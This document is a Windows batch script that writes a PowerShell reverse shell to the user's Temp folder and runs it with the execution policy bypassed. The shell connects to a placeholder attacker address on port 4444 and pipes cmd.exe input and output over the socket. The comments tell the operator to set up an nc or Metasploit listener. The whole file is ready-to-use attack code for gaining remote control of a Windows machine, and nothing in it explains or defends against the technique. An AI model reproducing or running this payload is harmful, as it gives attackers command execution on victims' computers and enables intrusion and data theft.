```batch
@echo off
rem Batch file will create Powershell script and run it after created
rem Modify IP and Port as required
rem start nc listener or for more fun start a meter listener
rem nc -lvp 4444
echo function cleanup { > "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo if ($client.Connected -eq $true) {$client.Close()} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo if ($process.ExitCode -ne $null) {$process.Close()} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo exit} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo // Setup IPADDR >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $address = 'xxx.xxx.xxx.xxx' >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo // Setup PORT >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $port = '4444' >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $client = New-Object system.net.sockets.tcpclient >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $client.connect($address,$port) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $stream = $client.GetStream() >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $process = New-Object System.Diagnostics.Process >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe' >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $process.StartInfo.RedirectStandardInput = 1 >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $process.StartInfo.RedirectStandardOutput = 1 >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $process.StartInfo.UseShellExecute = 0 >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $process.Start() >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $inputstream = $process.StandardInput >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $outputstream = $process.StandardOutput >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo Start-Sleep 1 >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $encoding = new-object System.Text.AsciiEncoding >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $stream.Write($encoding.GetBytes($out),0,$out.Length) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $out = $null; $done = $false; $testing = 0; >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo while (-not $done) { >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo if ($client.Connected -ne $true) {cleanup} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $pos = 0; $i = 1 >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) { >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo if ($pos -gt 0) { >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $string = $encoding.GetString($networkbuffer,0,$pos) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $inputstream.write($string) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo start-sleep 1 >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo if ($process.ExitCode -ne $null) {cleanup} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo else { >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $out = $encoding.GetString($outputstream.Read()) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo while($outputstream.Peek() -ne -1){ >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $stream.Write($encoding.GetBytes($out),0,$out.length) >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $out = $null >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
echo $string = $null}} else {cleanup}} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -noprofile -executionpolicy bypass -file C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
```
